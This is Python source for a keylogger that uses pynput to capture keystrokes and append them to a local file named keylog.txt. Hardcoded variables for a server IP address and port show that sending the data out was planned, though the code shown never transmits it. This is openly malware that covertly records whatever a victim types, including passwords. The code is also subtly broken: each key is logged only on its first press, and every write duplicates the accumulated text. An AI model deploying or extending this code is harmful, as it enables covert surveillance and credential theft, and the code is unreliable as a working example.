from pynput import keyboard
import time
import os

# Global text variable where keystrokes will be saved
text = ""

# Hard code the values of your server and ip address here.
ip_address = "192.168.2.5"
port_number = "1236"

# Remove the file if it already exists
if os.path.exists("keylog.txt"):
    os.remove("keylog.txt")  # Remove the file if it exists

# Function to write text to file
def write_to_file(text):
    with open("keylog.txt", "a") as file:
        file.write(text)  # Write the text to the file
        file.flush()  # Force immediate write (useful for continuous writing)

# List to track the keys that were pressed
pressed_keys = set()

# Function to start the keylogger
def start_keylogger():
    """
    Starts the keylogger to capture keystrokes and write them to a file.
    """
    def on_press(key):
        global text

        try:
            # Avoid logging the same key multiple times (only log once per key press)
            if key not in pressed_keys:
                pressed_keys.add(key)

                # Handle each key press
                if key == keyboard.Key.enter:
                    text += "\n"
                elif key == keyboard.Key.tab:
                    text += "\t"
                elif key == keyboard.Key.space:
                    text += " "
                elif key == keyboard.Key.shift:
                    pass  # Ignore shift key
                elif key == keyboard.Key.backspace:
                    # Handle backspace
                    if len(text) > 0:
                        text = text[:-1]
                elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    pass  # Ignore control keys
                elif key == keyboard.Key.esc:
                    return False  # Stop the listener on ESC key
                else:
                    # Convert the key object to a string and append it to the text variable
                    text += str(key).strip("'")

                # Write the updated text to file
                write_to_file(text)

            # Add a small sleep to prevent overload and multiple writes
            time.sleep(0.01)

        except Exception as e:
            print(f"Error: {e}")

    # Start the listener to capture key events
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
